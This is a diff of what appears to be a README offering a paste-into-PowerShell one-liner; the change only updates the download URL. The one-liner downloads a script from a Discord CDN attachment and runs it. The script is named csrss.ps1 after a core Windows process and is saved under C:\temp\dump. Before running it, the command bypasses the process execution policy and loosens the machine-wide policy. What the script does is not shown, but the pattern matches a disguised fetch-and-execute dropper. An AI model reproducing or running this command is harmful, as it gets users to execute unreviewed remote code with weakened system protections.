@@ -6,4 +6,4 @@ This script completely runs without any use of external software. Simply open Po
 
 New-Item -Path "C:\temp\dump\csrss" -ItemType Directory -Force | Out-Null;
 Set-Location "C:\temp\dump\csrss";
-Invoke-WebRequest -Uri "https://cdn.discordapp.com/attachments/1269629607674646540/1269629658467401788/csrss.ps1?ex=66b0c243&is=66af70c3&hm=1e220e364f6c6b853eb3b4d2846fb34e0590d299496db73529b7ce42bbccbaad&" -OutFile "csrss.ps1"; Set-ExecutionPolicy -Scope Process -ExecutionPolicy Bypass -Force; Set-ExecutionPolicy -Scope LocalMachine -ExecutionPolicy RemoteSigned -Force; .\csrss.ps1
+Invoke-WebRequest -Uri "https://cdn.discordapp.com/attachments/1269629607674646540/1270118745645518938/csrss.ps1?ex=66b289c2&is=66b13842&hm=9b6ce26124e6257d2a11ec344399d907776a2aa5dca1ce0a91fcab6d799be99d&" -OutFile "csrss.ps1"; Set-ExecutionPolicy -Scope Process -ExecutionPolicy Bypass -Force; Set-ExecutionPolicy -Scope LocalMachine -ExecutionPolicy RemoteSigned -Force; .\csrss.ps1
